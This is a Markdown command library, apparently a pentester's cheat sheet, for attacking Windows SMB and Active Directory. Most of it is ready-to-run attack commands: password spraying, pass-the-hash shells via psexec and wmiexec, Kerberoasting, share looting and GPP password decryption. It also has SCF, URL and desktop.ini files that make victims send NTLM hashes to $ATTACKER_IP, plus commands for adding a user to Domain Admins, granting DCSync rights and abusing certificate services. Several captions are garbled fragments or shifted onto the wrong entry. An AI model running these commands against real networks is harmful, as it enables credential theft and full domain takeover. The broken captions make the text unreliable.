---
id: "gxiw5tt11mpmy518l"
title: "smb"
description: ""
tags: []
order: "3"
createdAt: "2026-05-26T18:06:06.213Z"
updatedAt: "2026-05-26T19:10:53.893Z"
---

## Reconnaissance
<!-- section: {"id":"vzwiq81wtmpmy5idv","order":0,"collapsed":false} -->

### t8bzs44qcmpmy5igy
```bash
rustscan -a $TARGET -p 139,445 -- -sV -sC
```

_Reconnaissance Fast port scanning for SMB services._

**Tags:** recon, rustscan, nmap
<!-- cmd: {"id":"t8bzs44qcmpmy5igy","language":"bash","sectionId":"vzwiq81wtmpmy5idv","tags":["recon","rustscan","nmap"]} -->

### onzaln5oympmy5ih2
```bash
nmap -p 139,445 --script smb-protocols,smb-security-mode,smb2-capabilities,smb2-time $TARGET
```

_Tags: #recon, #rustscan, #nmap Detailed Nmap SMB enumeration and OS detection._

**Tags:** recon, nmap, smbinfo
<!-- cmd: {"id":"onzaln5oympmy5ih2","language":"bash","sectionId":"vzwiq81wtmpmy5idv","tags":["recon","nmap","smbinfo"]} -->

### m51fg8m86mpmy5ih6
```bash
nmap -p 139,445 --script smb-protocols,smb-security-mode,smb-enum-shares,smb-enum-users,smb-enum-groups,smb-enum-domains,smb-enum-services,smb2-capabilities,smb2-time $TARGET
```

_Tags: #recon, #nmap, #smbinfo Full SMB vulnerability and enumeration scan with Nmap._

**Tags:** recon, nmap, smbinfo, full-enum
<!-- cmd: {"id":"m51fg8m86mpmy5ih6","language":"bash","sectionId":"vzwiq81wtmpmy5idv","tags":["recon","nmap","smbinfo","full-enum"]} -->

### uqibkrocnmpmy5iha
```bash
nmap -p 445 --script smb2-security-mode $TARGET
nxc smb $TARGET -u '' -p '' --shares 2>/dev/null | grep -i encrypt
```

_Tags: #recon, #nmap, #smbinfo, #full-enum Check SMB encryption support._

**Tags:** recon, encryption, nmap, nxc
<!-- cmd: {"id":"uqibkrocnmpmy5iha","language":"bash","sectionId":"vzwiq81wtmpmy5idv","tags":["recon","encryption","nmap","nxc"]} -->

## Null Sessions
<!-- section: {"id":"dfdxo7t8wmpmy5ie2","order":1,"collapsed":false} -->

### 7r43wfxc5mpmy5ihm
```bash
nxc smb $TARGET -u '' -p '' --shares
```

_Null Sessions Anonymous authentication checks for shares and basic info._

**Tags:** smb, nullsession, shares, nxc
<!-- cmd: {"id":"7r43wfxc5mpmy5ihm","language":"bash","sectionId":"dfdxo7t8wmpmy5ie2","tags":["smb","nullsession","shares","nxc"]} -->

### 25uvoq4ejmpmy5ihp
```bash
smbclient -L //$TARGET -N
```

_Tags: #smb, #nullsession, #shares, #nxc List shares using smbclient without password._

**Tags:** smb, anonymous, smbclient
<!-- cmd: {"id":"25uvoq4ejmpmy5ihp","language":"bash","sectionId":"dfdxo7t8wmpmy5ie2","tags":["smb","anonymous","smbclient"]} -->

### 68h6fs0u5mpmy5ihs
```bash
rpcclient -U "" -N $TARGET
```

_Tags: #smb, #anonymous, #smbclient Connect to IPC$ share for RPC enumeration._

**Tags:** rpcclient, nullsession, ipc
<!-- cmd: {"id":"68h6fs0u5mpmy5ihs","language":"bash","sectionId":"dfdxo7t8wmpmy5ie2","tags":["rpcclient","nullsession","ipc"]} -->

### mn3alle3ampmy5ihw
```bash
enum4linux-ng -A $TARGET -o null_session_out
```

_session_

**Tags:** nullsession, enum4linux, enumeration
<!-- cmd: {"id":"mn3alle3ampmy5ihw","language":"bash","sectionId":"dfdxo7t8wmpmy5ie2","tags":["nullsession","enum4linux","enumeration"]} -->

## Guest Access
<!-- section: {"id":"feaa3t1q0mpmy5ie5","order":2,"collapsed":false} -->

### 4t17y4abhmpmy5ii4
```bash
nxc smb $TARGET -u 'guest' -p '' --shares
```

_Guest Access Check guest account access to shares._

**Tags:** guest, smb, shares
<!-- cmd: {"id":"4t17y4abhmpmy5ii4","language":"bash","sectionId":"feaa3t1q0mpmy5ie5","tags":["guest","smb","shares"]} -->

### acbjpvxdzmpmy5ii7
```bash
smbclient -L //$TARGET -U 'guest%'
```

_Tags: #guest, #smb, #shares Try guest access with smbclient._

**Tags:** guest, smb, smbclient
<!-- cmd: {"id":"acbjpvxdzmpmy5ii7","language":"bash","sectionId":"feaa3t1q0mpmy5ie5","tags":["guest","smb","smbclient"]} -->

## SMB Enumeration
<!-- section: {"id":"lvk1q8naampmy5ie8","order":3,"collapsed":false} -->

### 6azds3v23mpmy5iij
```bash
enum4linux-ng -A $TARGET
```

_SMB Enumeration Comprehensive enumeration of users, shares, groups, and policies._

**Tags:** enum4linux, enumeration
<!-- cmd: {"id":"6azds3v23mpmy5iij","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["enum4linux","enumeration"]} -->

### bs02le6e8mpmy5iim
```bash
nxc smb $TARGET -u $USER -p $PASS --pass-pol
```

_Tags: #enum4linux, #enumeration Enumerate domain password policy._

**Tags:** passwordpolicy, nxc, enumeration
<!-- cmd: {"id":"bs02le6e8mpmy5iim","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["passwordpolicy","nxc","enumeration"]} -->

### 6hjnik5d7mpmy5iip
```bash
nxc smb $TARGET -u $USER -p $PASS --users --groups
```

_Tags: #passwordpolicy, #nxc, #enumeration Enumerate domain users and groups._

**Tags:** users, groups, nxc, enumeration
<!-- cmd: {"id":"6hjnik5d7mpmy5iip","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["users","groups","nxc","enumeration"]} -->

### xr9re1vnkmpmy5iis
```bash
smbmap -H $TARGET -u $USER -p $PASS
```

_Tags: #users, #groups, #nxc, #enumeration List shares and permissions with smbmap._

**Tags:** smbmap, shares, permissions
<!-- cmd: {"id":"xr9re1vnkmpmy5iis","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["smbmap","shares","permissions"]} -->

### 7ivekyggnmpmy5iiw
```bash
nxc smb $TARGET -u $USER -p $PASS --sessions
```

_Tags: #smbmap, #shares, #permissions Enumerate active SMB sessions on target._

**Tags:** sessions, enumeration, nxc
<!-- cmd: {"id":"7ivekyggnmpmy5iiw","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["sessions","enumeration","nxc"]} -->

### vixbmf7uxmpmy5iiz
```bash
nxc smb $TARGET -u $USER -p $PASS --loggedon-users
```

_Tags: #sessions, #enumeration, #nxc Enumerate logged-on users on the target machine._

**Tags:** loggedon-users, enumeration, nxc
<!-- cmd: {"id":"vixbmf7uxmpmy5iiz","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["loggedon-users","enumeration","nxc"]} -->

### puypzgfw5mpmy5ij2
```bash
nxc smb $TARGET -u $USER -p $PASS --list-services
impacket-services.py $DOMAIN/$USER:$PASS@$TARGET list
```

_Tags: #loggedon-users, #enumeration, #nxc List services via SMB/RPC._

**Tags:** services, enumeration, nxc, impacket
<!-- cmd: {"id":"puypzgfw5mpmy5ij2","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["services","enumeration","nxc","impacket"]} -->

### xpwxmis5kmpmy5ij5
```bash
nxc smb $TARGET -u $USER -p $PASS --local-groups
rpcclient -U "$DOMAIN/$USER%$PASS" $TARGET -c "enumalsgroups domain"
```

_Tags: #services, #enumeration, #nxc, #impacket Enumerate local groups and members._

**Tags:** local-groups, enumeration, nxc, rpcclient
<!-- cmd: {"id":"xpwxmis5kmpmy5ij5","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["local-groups","enumeration","nxc","rpcclient"]} -->

### dadwy3pddmpmy5ij8
```bash
impacket-smbclient $DOMAIN/$USER:$PASS@$TARGET -c "info"
nxc smb $TARGET -u $USER -p $PASS --pipes
```

_Tags: #local-groups, #enumeration, #nxc, #rpcclient Enumerate named pipes available over SMB._

**Tags:** namedpipes, enumeration, nxc, impacket
<!-- cmd: {"id":"dadwy3pddmpmy5ij8","language":"bash","sectionId":"lvk1q8naampmy5ie8","tags":["namedpipes","enumeration","nxc","impacket"]} -->

## RID Bruteforce
<!-- section: {"id":"memxwt5scmpmy5ieb","order":4,"collapsed":false} -->

### d2gvy2rbsmpmy5ijk
```bash
nxc smb $TARGET -u '' -p '' --rid-brute
```

_RID Bruteforce Enumerate domain users via RID cycling over null session or authenticated session._

**Tags:** rid, users, enumeration, nullsession
<!-- cmd: {"id":"d2gvy2rbsmpmy5ijk","language":"bash","sectionId":"memxwt5scmpmy5ieb","tags":["rid","users","enumeration","nullsession"]} -->

### dd3oiwj02mpmy5ijo
```bash
nxc smb $TARGET -u '' -p '' --rid-brute 4000
nxc smb $TARGET -u $USER -p $PASS --rid-brute | grep SidTypeUser
```

_Tags: #rid, #users, #enumeration, #nullsession RID bruteforce with custom range and output._

**Tags:** rid, users, enumeration
<!-- cmd: {"id":"dd3oiwj02mpmy5ijo","language":"bash","sectionId":"memxwt5scmpmy5ieb","tags":["rid","users","enumeration"]} -->

### rm3ri4g86mpmy5ijr
```bash
rpcclient -U "$DOMAIN/$USER%$PASS" $TARGET -c "enumdomusers"
```

_Tags: #rid, #users, #enumeration Manual RID cycling via rpcclient._

**Tags:** rpcclient, rid, users
<!-- cmd: {"id":"rm3ri4g86mpmy5ijr","language":"bash","sectionId":"memxwt5scmpmy5ieb","tags":["rpcclient","rid","users"]} -->

## Authentication & Password Spraying
<!-- section: {"id":"c1csspfnsmpmy5iee","order":5,"collapsed":false} -->

### fvx3p5jj9mpmy5ijz
```bash
nxc smb $TARGET -u users.txt -p passwords.txt --continue-on-success
```

_Authentication & Password Spraying Test credentials across domain accounts via SMB._

**Tags:** spray, passwords, auth, nxc
<!-- cmd: {"id":"fvx3p5jj9mpmy5ijz","language":"bash","sectionId":"c1csspfnsmpmy5iee","tags":["spray","passwords","auth","nxc"]} -->

### ptnnb3dwrmpmy5ik3
```bash
kerbrute passwordspray --dc $DC -d $DOMAIN users.txt 'Winter2025!'
```

_Tags: #spray, #passwords, #auth, #nxc Kerberos-based password spraying (safer, less noisy on SMB)._

**Tags:** kerberos, spray, kerbrute
<!-- cmd: {"id":"ptnnb3dwrmpmy5ik3","language":"bash","sectionId":"c1csspfnsmpmy5iee","tags":["kerberos","spray","kerbrute"]} -->

### 2gl8julyympmy5ik6
```bash
nxc smb targets.txt -u $USER -p $PASS --local-auth
```

_Tags: #kerberos, #spray, #kerbrute Spray local accounts across multiple targets._

**Tags:** localauth, spray, nxc
<!-- cmd: {"id":"2gl8julyympmy5ik6","language":"bash","sectionId":"c1csspfnsmpmy5iee","tags":["localauth","spray","nxc"]} -->

### c2smrciefmpmy5ik9
```bash
nxc smb $TARGET -u $USER -p $PASS --pass-pol
nxc smb $DC -u $USER -p $PASS --users | grep -i "BadPwdCount"
```

_Tags: #localauth, #spray, #nxc Check for password policies before spraying to avoid lockouts._

**Tags:** passwordpolicy, spray, lockout, nxc
<!-- cmd: {"id":"c2smrciefmpmy5ik9","language":"bash","sectionId":"c1csspfnsmpmy5iee","tags":["passwordpolicy","spray","lockout","nxc"]} -->

## Pass-the-Hash (PtH)
<!-- section: {"id":"u3jgrbnugmpmy5ieh","order":6,"collapsed":false} -->

### kkwdw1g0vmpmy5ikn
```bash
nxc smb $TARGET -u $USER -H $HASH
```

_Pass-the-Hash (PtH) Authenticate using NTLM hash via SMB._

**Tags:** pth, ntlm, nxc
<!-- cmd: {"id":"kkwdw1g0vmpmy5ikn","language":"bash","sectionId":"u3jgrbnugmpmy5ieh","tags":["pth","ntlm","nxc"]} -->

### 6q1u7t53zmpmy5ikr
```bash
impacket-psexec -hashes :$HASH $DOMAIN/$USER@$TARGET
```

_Tags: #pth, #ntlm, #nxc Execute command using Pass-the-Hash._

**Tags:** pth, psexec, impacket
<!-- cmd: {"id":"6q1u7t53zmpmy5ikr","language":"bash","sectionId":"u3jgrbnugmpmy5ieh","tags":["pth","psexec","impacket"]} -->

### 04xmvs4uimpmy5iku
```bash
impacket-wmiexec -hashes :$HASH $DOMAIN/$USER@$TARGET
```

_Tags: #pth, #psexec, #impacket Pass-the-Hash with WMI exec (stealthier, no service creation)._

**Tags:** pth, wmiexec, impacket, stealth
<!-- cmd: {"id":"04xmvs4uimpmy5iku","language":"bash","sectionId":"u3jgrbnugmpmy5ieh","tags":["pth","wmiexec","impacket","stealth"]} -->

### u3b4b92yempmy5ikx
```bash
impacket-smbexec -hashes :$HASH $DOMAIN/$USER@$TARGET
```

_Tags: #pth, #wmiexec, #impacket, #stealth Pass-the-Hash with smbexec (no binary dropped on disk)._

**Tags:** pth, smbexec, impacket, stealth
<!-- cmd: {"id":"u3b4b92yempmy5ikx","language":"bash","sectionId":"u3jgrbnugmpmy5ieh","tags":["pth","smbexec","impacket","stealth"]} -->

## Kerberoasting & ASREPRoasting (SMB Context)
<!-- section: {"id":"7etv3v9zdmpmy5iel","order":7,"collapsed":false} -->

### 5zgfp1asnmpmy5il8
```bash
impacket-GetUserSPNs $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile kerberoast.txt
impacket-GetUserSPNs $DOMAIN/$USER -hashes $HASH -dc-ip $DC -request -outputfile kerberoast.txt
nxc ldap $DC -u $USER -p $PASS --kerberoasting kerberoast.txt
```

_Kerberoasting & ASREPRoasting (SMB Context) Find Kerberoastable accounts via LDAP/SMB and request TGS tickets._

**Tags:** kerberoasting, spn, impacket, nxc, ad-abuse
<!-- cmd: {"id":"5zgfp1asnmpmy5il8","language":"bash","sectionId":"7etv3v9zdmpmy5iel","tags":["kerberoasting","spn","impacket","nxc","ad-abuse"]} -->

### dib52ks72mpmy5ilb
```bash
targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC -o targeted_kerb.txt
targetedKerberoast.py -d $DOMAIN -u $USER -p $PASS --dc-ip $DC --only-abuse
```

_Tags: #kerberoasting, #spn, #impacket, #nxc, #ad-abuse Targeted Kerberoasting — abuse ACL to set SPN on a controlled account._

**Tags:** kerberoasting, targeted, acl-abuse, ad-abuse
<!-- cmd: {"id":"dib52ks72mpmy5ilb","language":"bash","sectionId":"7etv3v9zdmpmy5iel","tags":["kerberoasting","targeted","acl-abuse","ad-abuse"]} -->

### fecdis3n0mpmy5ile
```bash
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC -format hashcat -outputfile asrep.txt
impacket-GetNPUsers $DOMAIN/$USER:$PASS -dc-ip $DC -request -format hashcat -outputfile asrep.txt
nxc ldap $DC -u $USER -p $PASS --asreproast asrep.txt
```

_Tags: #kerberoasting, #targeted, #acl-abuse, #ad-abuse ASREPRoasting — find accounts with no Kerberos pre-authentication._

**Tags:** asreproasting, preauthentication, impacket, nxc, ad-abuse
<!-- cmd: {"id":"fecdis3n0mpmy5ile","language":"bash","sectionId":"7etv3v9zdmpmy5iel","tags":["asreproasting","preauthentication","impacket","nxc","ad-abuse"]} -->

## Share Looting & Spidering
<!-- section: {"id":"bda00a69smpmy5ien","order":8,"collapsed":false} -->

### l3bwlz4nampmy5ilm
```bash
smbmap -H $TARGET -u $USER -p $PASS -R
```

_Share Looting & Spidering Recursively search for sensitive files in shares._

**Tags:** shares, loot, smbmap
<!-- cmd: {"id":"l3bwlz4nampmy5ilm","language":"bash","sectionId":"bda00a69smpmy5ien","tags":["shares","loot","smbmap"]} -->

### 9nernb5gvmpmy5ilp
```bash
nxc smb $TARGET -u $USER -p $PASS -M spider_plus -o READ_ONLY=False
```

_plus -o READ_

**Tags:** spider, loot, nxc
<!-- cmd: {"id":"9nernb5gvmpmy5ilp","language":"bash","sectionId":"bda00a69smpmy5ien","tags":["spider","loot","nxc"]} -->

### 265avzzsrmpmy5ils
```bash
smbclient //$TARGET/Share -U $DOMAIN/$USER%$PASS -c 'prompt OFF; recurse ON; mget *'
```

_Tags: #spider, #loot, #nxc Interactive file download/upload via smbclient._

**Tags:** smbclient, download, loot
<!-- cmd: {"id":"265avzzsrmpmy5ils","language":"bash","sectionId":"bda00a69smpmy5ien","tags":["smbclient","download","loot"]} -->

### wlkm9gx1kmpmy5ilw
```bash
smbclient //$TARGET/Share -U $DOMAIN/$USER%$PASS -c 'prompt OFF; recurse ON; mget *.docx *.xlsx *.pdf *.txt *.xml *.ini *.config'
```

_Tags: #smbclient, #download, #loot Download specific file types from a share._

**Tags:** smbclient, download, loot, targeted
<!-- cmd: {"id":"wlkm9gx1kmpmy5ilw","language":"bash","sectionId":"bda00a69smpmy5ien","tags":["smbclient","download","loot","targeted"]} -->

### hfo7st31empmy5ily
```cmd
findstr /S /I /C:"password" *.txt *.xml *.ini *.config *.ps1 *.bat
```

_Tags: #smbclient, #download, #loot, #targeted Search for passwords in mounted shares (Windows CMD)._

**Tags:** passwords, files, windows
<!-- cmd: {"id":"hfo7st31empmy5ily","language":"cmd","sectionId":"bda00a69smpmy5ien","tags":["passwords","files","windows"]} -->

### hdjz2fr9cmpmy5im2
```bash
smbmap -H $TARGET -u $USER -p $PASS -R -A 'passw|cred|secret|login|\.kdbx|\.ppk|id_rsa|\.pem|\.key|unattend|web\.config|sysprep|groups\.xml|services\.xml|scheduledtasks\.xml|printers\.xml|drives\.xml|datasources\.xml'
```

_Tags: #passwords, #files, #windows Search for sensitive files in shares via Linux (grep approach)._

**Tags:** passwords, files, loot, smbmap
<!-- cmd: {"id":"hdjz2fr9cmpmy5im2","language":"bash","sectionId":"bda00a69smpmy5ien","tags":["passwords","files","loot","smbmap"]} -->

## GPP Password Extraction from SYSVOL
<!-- section: {"id":"q0uycn5k4mpmy5ier","order":9,"collapsed":false} -->

### fv7uskcr5mpmy5imh
```bash
smbclient //$DC/SYSVOL -U $DOMAIN/$USER%$PASS -c 'prompt OFF; recurse ON; cd $DOMAIN\Policies; mget *.xml'
```

_GPP Password Extraction from SYSVOL Search SYSVOL share for Group Policy Preferences (GPP) cpassword fields — contains AES-256 encrypted passwords that Microsoft publicly disclosed the key for._

**Tags:** gpp, sysvol, passwords, misconfiguration
<!-- cmd: {"id":"fv7uskcr5mpmy5imh","language":"bash","sectionId":"q0uycn5k4mpmy5ier","tags":["gpp","sysvol","passwords","misconfiguration"]} -->

### u0lwdxzcompmy5imk
```bash
find ./Policies/ -name '*.xml' -exec grep -l 'cpassword' {} \;
gpp-decrypt <cpassword_hash>
```

_Tags: #gpp, #sysvol, #passwords, #misconfiguration Find and decrypt GPP passwords using gpp-decrypt._

**Tags:** gpp, decrypt, passwords, post-exploitation
<!-- cmd: {"id":"u0lwdxzcompmy5imk","language":"bash","sectionId":"q0uycn5k4mpmy5ier","tags":["gpp","decrypt","passwords","post-exploitation"]} -->

### 9i817mezwmpmy5imo
```bash
smbmap -H $DC -u $USER -p $PASS -R -s SYSVOL -A 'Groups\.xml|Services\.xml|ScheduledTasks\.xml|Printers\.xml|Drives\.xml|DataSources\.xml'
```

_Tags: #gpp, #decrypt, #passwords, #post-exploitation One-liner to find and extract GPP passwords from SYSVOL._

**Tags:** gpp, sysvol, one-liner, loot
<!-- cmd: {"id":"9i817mezwmpmy5imo","language":"bash","sectionId":"q0uycn5k4mpmy5ier","tags":["gpp","sysvol","one-liner","loot"]} -->

## SCF & URL File Attacks on Writable Shares
<!-- section: {"id":"ogztrs52hmpmy5ieu","order":10,"collapsed":false} -->

### ab7i62ftvmpmy5imw
```bash
cat > @Inventory.scf << 'EOF'
[Shell]
Command=2
IconFile=\\$ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
smbclient //$TARGET/Share -U $DOMAIN/$USER%$PASS -c 'put @Inventory.scf'
```

_SCF & URL File Attacks on Writable Shares Drop a .scf file on a writable share to capture NTLMv2 hashes when a user browses the directory._

**Tags:** scf, ntlm-capture, writable-share, coercion
<!-- cmd: {"id":"ab7i62ftvmpmy5imw","language":"bash","sectionId":"ogztrs52hmpmy5ieu","tags":["scf","ntlm-capture","writable-share","coercion"]} -->

### ed7lacdexmpmy5imz
```bash
cat > @README.url << 'EOF'
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\$ATTACKER_IP\share\icon.ico
IconIndex=1
EOF
smbclient //$TARGET/Share -U $DOMAIN/$USER%$PASS -c 'put @README.url'
```

_Tags: #scf, #ntlm-capture, #writable-share, #coercion Drop a .url file on a writable share to capture NTLMv2 hashes._

**Tags:** url-file, ntlm-capture, writable-share, coercion
<!-- cmd: {"id":"ed7lacdexmpmy5imz","language":"bash","sectionId":"ogztrs52hmpmy5ieu","tags":["url-file","ntlm-capture","writable-share","coercion"]} -->

### 61sbedd22mpmy5in2
```bash
cat > desktop.ini << 'EOF'
[.ShellClassInfo]
IconResource=\\$ATTACKER_IP\share\icon.ico,0
EOF
smbclient //$TARGET/Share -U $DOMAIN/$USER%$PASS -c 'cd SomeFolder; put desktop.ini'
```

_Tags: #url-file, #ntlm-capture, #writable-share, #coercion Drop a desktop.ini to force authentication via icon path._

**Tags:** desktop-ini, ntlm-capture, writable-share
<!-- cmd: {"id":"61sbedd22mpmy5in2","language":"bash","sectionId":"ogztrs52hmpmy5ieu","tags":["desktop-ini","ntlm-capture","writable-share"]} -->

## LAPS & gMSA via SMB
<!-- section: {"id":"mb350gk94mpmy5iew","order":11,"collapsed":false} -->

### smsgv25g7mpmy5ina
```bash
nxc ldap $DC -u $USER -p $PASS -M laps
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get search --filter '(ms-Mcs-AdmPwd=*)' --attr sAMAccountName,ms-Mcs-AdmPwd
```

_LAPS & gMSA via SMB Read LAPS (Local Administrator Password Solution) passwords from LDAP via SMB-authenticated session._

**Tags:** laps, credential-access, misconfiguration, bloodyad, nxc
<!-- cmd: {"id":"smsgv25g7mpmy5ina","language":"bash","sectionId":"mb350gk94mpmy5iew","tags":["laps","credential-access","misconfiguration","bloodyad","nxc"]} -->

### by6tw9p5vmpmy5ind
```bash
nxc ldap $DC -u $USER -p $PASS --gmsa
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get object "gMSA_ACCOUNT$" --attr msDS-ManagedPassword
```

_Tags: #laps, #credential-access, #misconfiguration, #bloodyad, #nxc Dump gMSA (Group Managed Service Account) managed passwords._

**Tags:** gmsa, credential-access, bloodyad, nxc, ad-abuse
<!-- cmd: {"id":"by6tw9p5vmpmy5ind","language":"bash","sectionId":"mb350gk94mpmy5iew","tags":["gmsa","credential-access","bloodyad","nxc","ad-abuse"]} -->

## Shadow Credentials Attack
<!-- section: {"id":"ya6skfq1kmpmy5if0","order":12,"collapsed":false} -->

### ng38xro8nmpmy5ink
```bash
pywhisker.py -d $DOMAIN -u $USER -p $PASS --target $TARGET_USER --action add --dc-ip $DC
pywhisker.py -d $DOMAIN -u $USER -p $PASS --target $TARGET_USER --action list --dc-ip $DC
```

_Shadow Credentials Attack Write msDS-KeyCredentialLink to a target object via pywhisker to take over the account._

**Tags:** shadow-credentials, acl-abuse, pywhisker, ad-abuse, privilege-escalation
<!-- cmd: {"id":"ng38xro8nmpmy5ink","language":"bash","sectionId":"ya6skfq1kmpmy5if0","tags":["shadow-credentials","acl-abuse","pywhisker","ad-abuse","privilege-escalation"]} -->

### p1rcs3gm0mpmy5ino
```bash
gettgtpkinit.py -cert-pfx <cert.pfx> -pfx-pass <password> $DOMAIN/$TARGET_USER target_user.ccache
KRB5CCNAME=target_user.ccache nxc smb $TARGET -u $TARGET_USER --use-kcache
```

_USER target_

**Tags:** shadow-credentials, pkinit, privilege-escalation, ad-abuse
<!-- cmd: {"id":"p1rcs3gm0mpmy5ino","language":"bash","sectionId":"ya6skfq1kmpmy5if0","tags":["shadow-credentials","pkinit","privilege-escalation","ad-abuse"]} -->

## ACL Enumeration & Abuse (SMB Context)
<!-- section: {"id":"uvmz16k2xmpmy5if3","order":13,"collapsed":false} -->

### i8xqk20cumpmy5inw
```bash
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get object "$USER" --attr nTSecurityDescriptor
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get writable
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC get membership "$USER"
nxc ldap $DC -u $USER -p $PASS --dacl-enum
```

_ACL Enumeration & Abuse (SMB Context) Enumerate ACLs and writable attributes with bloodyAD via SMB-authenticated session._

**Tags:** acl, dacl, bloodyad, nxc, ad-abuse, enumeration
<!-- cmd: {"id":"i8xqk20cumpmy5inw","language":"bash","sectionId":"uvmz16k2xmpmy5if3","tags":["acl","dacl","bloodyad","nxc","ad-abuse","enumeration"]} -->

### kf2qioxaempmy5inz
```bash
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC add groupMember "Domain Admins" "$USER"
nxc ldap $DC -u $USER -p $PASS -M add_user_to_group -o GROUP="Domain Admins" USER="$USER"
```

_user_

**Tags:** acl-abuse, generic-all, privilege-escalation, bloodyad, ad-abuse
<!-- cmd: {"id":"kf2qioxaempmy5inz","language":"bash","sectionId":"uvmz16k2xmpmy5if3","tags":["acl-abuse","generic-all","privilege-escalation","bloodyad","ad-abuse"]} -->

### l5klm1z7wmpmy5io2
```bash
bloodyAD -u $USER -p $PASS -d $DOMAIN --host $DC set password "$TARGET_USER" "NewPass123!"
```

_Tags: #acl-abuse, #generic-all, #privilege-escalation, #bloodyad, #ad-abuse Reset target user password via ForceChangePassword / GenericAll ACL._

**Tags:** acl-abuse, force-change-password, credential-access, bloodyad, ad-abuse
<!-- cmd: {"id":"l5klm1z7wmpmy5io2","language":"bash","sectionId":"uvmz16k2xmpmy5if3","tags":["acl-abuse","force-change-password","credential-access","bloodyad","ad-abuse"]} -->

### pcevjjwvsmpmy5io5
```bash
owneredit.py -action write -new-owner $USER -target $TARGET_USER -d $DOMAIN -u $USER -p $PASS -dc-ip $DC
```

_Tags: #acl-abuse, #force-change-password, #credential-access, #bloodyad, #ad-abuse Change ownership of AD object via owneredit._

**Tags:** ownership, acl-abuse, owneredit, ad-abuse
<!-- cmd: {"id":"pcevjjwvsmpmy5io5","language":"bash","sectionId":"uvmz16k2xmpmy5if3","tags":["ownership","acl-abuse","owneredit","ad-abuse"]} -->

### 4kyybxkfnmpmy5io8
```bash
dacledit.py -action write -rights DCSync -principal $USER -target-dn "DC=$DOMAIN,DC=local" -d $DOMAIN -u $USER -p $PASS -dc-ip $DC
```

_Tags: #ownership, #acl-abuse, #owneredit, #ad-abuse Grant DCSync rights via WriteDacl ACL abuse._

**Tags:** acl-abuse, dcsync, writedacl, privilege-escalation, ad-abuse
<!-- cmd: {"id":"4kyybxkfnmpmy5io8","language":"bash","sectionId":"uvmz16k2xmpmy5if3","tags":["acl-abuse","dcsync","writedacl","privilege-escalation","ad-abuse"]} -->

## AD CS — Certificate Services Abuse (SMB Context)
<!-- section: {"id":"dd05j3k5xmpmy5if5","order":14,"collapsed":false} -->

### p3mgifb2umpmy5iop
```bash
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -output ./certipy_output
```

_AD CS — Certificate Services Abuse (SMB Context) Find vulnerable certificate templates via Certipy using SMB-authenticated session._

**Tags:** adcs, certipy, certificate-templates, ad-abuse, privilege-escalation
<!-- cmd: {"id":"p3mgifb2umpmy5iop","language":"bash","sectionId":"dd05j3k5xmpmy5if5","tags":["adcs","certipy","certificate-templates","ad-abuse","privilege-escalation"]} -->

### i9hnl6y2vmpmy5ios
```bash
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -target $CA_SERVER -template VulnTemplate -upn administrator@$DOMAIN -ca "$CA_NAME"
```

_SERVER -template VulnTemplate -upn administrator@$DOMAIN -ca "$CA_

**Tags:** adcs, esc1, certipy, privilege-escalation
<!-- cmd: {"id":"i9hnl6y2vmpmy5ios","language":"bash","sectionId":"dd05j3k5xmpmy5if5","tags":["adcs","esc1","certipy","privilege-escalation"]} -->

### jkx4x7qcwmpmy5iov
```bash
impacket-ntlmrelayx -t http://$CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
```

_Tags: #adcs, #esc1, #certipy, #privilege-escalation ESC8 — NTLM Relay to AD CS web enrollment._

**Tags:** adcs, esc8, ntlmrelayx, relay, privilege-escalation
<!-- cmd: {"id":"jkx4x7qcwmpmy5iov","language":"bash","sectionId":"dd05j3k5xmpmy5if5","tags":["adcs","esc8","ntlmrelayx","relay","privilege-escalation"]} -->

### mepeakdacmpmy5ioz
```bash
certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC
```

_Tags: #adcs, #esc8, #ntlmrelayx, #relay, #privilege-escalation Authenticate with PFX certificate to get a TGT._

**Tags:** adcs, pfx, authentication, certipy
<!-- cmd: {"id":"mepeakdacmpmy5ioz","language":"bash","sectionId":"dd05j3k5xmpmy5if5","tags":["adcs","pfx","authentication","certipy"]} -->

## Vulnerability Checks
<!-- section: {"id":"x69zzuidempmy5if9","order":15,"collapsed":false} -->

### pqntycezdmpmy5ip9
```bash
nmap --script smb-vuln* -p 139,445 $TARGET
```

_Vulnerability Checks Check for common SMB vulnerabilities (EternalBlue, etc.)._

**Tags:** vulns, nmap, smb
<!-- cmd: {"id":"pqntycezdmpmy5ip9","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["vulns","nmap","smb"]} -->

### o8vi5or4fmpmy5ipc
```bash
nxc smb $TARGET -u $USER -p $PASS --gen-relay-list relay_targets.txt
```

_Tags: #vulns, #nmap, #smb Check if SMB Signing is disabled (Crucial for Relay attacks)._

**Tags:** signing, relay, nxc
<!-- cmd: {"id":"o8vi5or4fmpmy5ipc","language":"bash","sectionId":"x69zzuidempmy5if9","tags":["signing","relay","nxc"]} -->

### 2orvuqkhhmpmy5ipf
```bash
msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $TARGET; run"
```

_ms17_

**Tags:** eternalblue, ms17-010, metasploit
